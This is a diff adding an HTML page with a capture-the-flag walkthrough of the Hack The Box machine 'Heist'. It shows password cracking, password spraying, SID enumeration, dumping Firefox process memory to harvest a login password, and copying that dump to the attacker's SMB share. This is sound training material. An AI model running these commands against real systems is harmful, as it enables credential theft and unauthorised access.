@@ -1,0 +1,297 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Heist</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.6</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Support Login Page
+|_Requested resource was login.php
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+
+<p class="text">SMB and http server are open. Also we notice port 5985 is open, where we we can use evil-winrm.</p>
+<p class="text">We can confirm there is no available shares with guest user below.</p>
+<div class="code-box"><pre><code>└─$ smbmap -H 10.129.96.157           
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                                                   [|] Checking for open ports...                                                                                                   [/] Checking for open ports...                                                                                                   [*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
+[*] Closed 1 connections</code></pre></div>
+
+<p class="text">So, HTTP server would have information we can make use of.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/heist/1.png' %}" alt="">
+    <p class="text">I overlooked there is guest login at first, but we can visit issues.php page with this button.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/heist/2.png' %}" alt="">
+    <p class="text">Here we can the username admin and Hazard. Also we can know the target uses cisco router. Let's take note and visit attachment file page.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/heist/3.png' %}" alt="">
+    <p class="text">On the page, I found 3 passwords. The first one is md5 hash, and second and third passwords are cisco 7 passowrd. We can decode them with some tools.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/4.png' %}" alt="">
+    <p class="text">Simple google research revealed <a href="https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html">this cisco password decryption tool</a>, and successfully decoded the two password. <br><br>The plaintext passwords are <u>$uperP@ssword</u> and <u>Q4)sJu\Y8qz*A3?d</u>.</p>
+</div>
+
+<p class="text">Also, we can try cracking the md5 hashed password with john.</p>
+<div class="code-box"><pre><code>└─$ echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+...
+stealth1agent</code></pre></div>
+
+<p class="text">We collected 2 usernames and 3 password. It's enough for performing password spraying. Let's do this with crackmapexec.</p>
+<p class="text">First we need to create username and password list.</p>
+<div class="code-box"><pre><code>└─$ cat user.txt
+Hazard
+admin
+
+└─$ cat passwords.txt
+$uperP@ssword
+Q4)sJu\Y8qz*A3?d
+stealth1agent</code></pre></div>
+
+<p class="text">Then perform password spraying.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.96.157 -u user.txt -p passwords.txt --continue-on-success         
+SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Hazard:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [+] <u>SupportDesk\Hazard:stealth1agent </u>
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE </code></pre></div>
+
+<p class="text">We revealed the password for Hazard is <u>stealth1agent</u>.</p>
+
+<p class="text">However, he has no privilege to access remotely.</p>
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.96.157 -u Hazard -p 'stealth1agent'                            
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                                        
+Error: Exiting with code 1</code></pre></div>
+
+<p class="text">So, we might find other users and can perform password spraying again.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-lookupsid Hazard:stealth1agent@10.129.96.157
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Brute forcing SIDs at 10.129.96.157
+[*] StringBinding ncacn_np:10.129.96.157[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)</code></pre></div>
+
+<p class="text">As expected, there are two additional users : Chase and Jason.</p>
+<p class="text">Let's create username list using this output.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab]
+└─$ impacket-lookupsid Hazard:stealth1agent@10.129.96.157 > user2.txt                
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab]
+└─$ grep -oP '(?i)(?<=supportdesk\\)[^:\s\)\\]+' user2.txt > userlist.txt
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab]
+└─$ cat userlist.txt                                                                 
+Administrator
+Guest
+DefaultAccount
+WDAGUtilityAccount
+None
+Hazard
+support
+Chase
+Jason</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.96.157 -u userlist.txt -p passwords.txt --continue-on-success
+SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+...
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Chase:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [+] <u>SupportDesk\Chase:Q4)sJu\Y8qz*A3?d </u>
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Chase:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:stealth1agent STATUS_LOGON_FAILURE </code></pre></div>
+
+<p class="text">We got one more credentials for Chase user.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.96.157 -u chase -p 'Q4)sJu\Y8qz*A3?d'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Chase\Documents> </code></pre></div>
+
+<p class="text">We could logon to the target machine this time.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>
+*Evil-WinRM* PS C:\Users\Chase\Desktop> dir
+
+
+    Directory: C:\Users\Chase\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/22/2019   9:08 AM            121 todo.txt
+-ar---        11/6/2025   2:22 PM             34 user.txt</code></pre></div>
+
+<p class="text">On the user's Desktop, we have additional file named todo.txt.</p>
+
+<div class="code-box">*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
+Stuff to-do:
+1. Keep checking the issues list.
+2. Fix the router config.
+
+Done:
+1. Restricted access for guest user.</div>
+
+<p class="text">The no.1 memo implies he also keep opening web browser, which is also keep logging on.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process -name firefox
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    355      25    16480      38944       0.16   6212   1 firefox
+   1067      69   140852     494916       7.72   6372   1 firefox
+    347      19    10232      38824       0.09   6480   1 firefox
+    401      33    33648      90216       1.13   6604   1 firefox
+    378      28    22648      59444       0.28   6864   1 firefox</code></pre></div>
+
+<p class="text">We can confirm it with get-process cmdlet. Also, there is a firefox process which is using high CPU rate.</p>
+<p class="text">We may find another juicy information with analyzing its process memory. For that purpose, we can use procdump.exe.</p>
+<p class="text">You can download zip file with code below.</p>
+<div class="code-box"><pre><code>└─$ wget https://download.sysinternals.com/files/Procdump.zip
+└─$ unzip Procdump.zip
+└─$ ls
+Eula.txt  procdump64a.exe  procdump64.exe  procdump.exe</code></pre></div>
+
+<p class="text">Let's upload this procdump64.exe on the target machine.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\Chase\Desktop> upload /path/to/procdump64.exe</code></pre></div>
+<p class="text">Then, we can generate file containing process memory with this exe file.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\Chase\Desktop> <u>.\procdump64.exe -ma 6372 -accepteula</u>
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop> dir
+
+
+    Directory: C:\Users\Chase\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/6/2025   3:53 PM      502498677 <u>firefox.exe_251106_155355.dmp</u>
+-a----        11/6/2025   3:46 PM         791960 procdump.exe
+-a----        11/6/2025   3:45 PM         424856 procdump64.exe
+-a----        4/22/2019   9:08 AM            121 todo.txt
+-ar---        11/6/2025   2:22 PM             34 user.txt</code></pre></div>
+
+<p class="text">Then, we have to download this file to our local machine. I used impacket-smbserver since evil-winrm's download function didn't work well.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a
+
+
+
+*Evil-WinRM* PS C:\Users\Chase\Desktop> net use \\10.10.16.38\share /user:a a
+*Evil-WinRM* PS C:\Users\Chase\Desktop> copy firefox.exe_251106_155355.dmp \\10.10.16.38\share</code></pre></div>
+<p class="text">Then we can analyze firefox.exe_251106_155355.dmp locally.</p>
+
+
+<div class="code-box"><pre><code>└─$ strings firefox.exe_251106_155355.dmp | grep login_password 
+http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+...</code></pre></div>
+
+<p class="text">We got additional password <u>4dD!5}x/re8]FBuZ</u>. Let's perform password spraying again.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.96.157 -u userlist.txt -p '4dD!5}x/re8]FBuZ'
+SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Administrator:4dD!5}x/re8]FBuZ (Pwn3d!)</code></pre></div>
+
+<p class="text">Luckily, this password is for admin user. </p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i 10.129.96.157 -u Administrator -p '4dD!5}x/re8]FBuZ'                  
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+supportdesk\administrator</code></pre></div>
+
+<p class="text">We got admin user.</p>
+
+
+</body>
+</html>
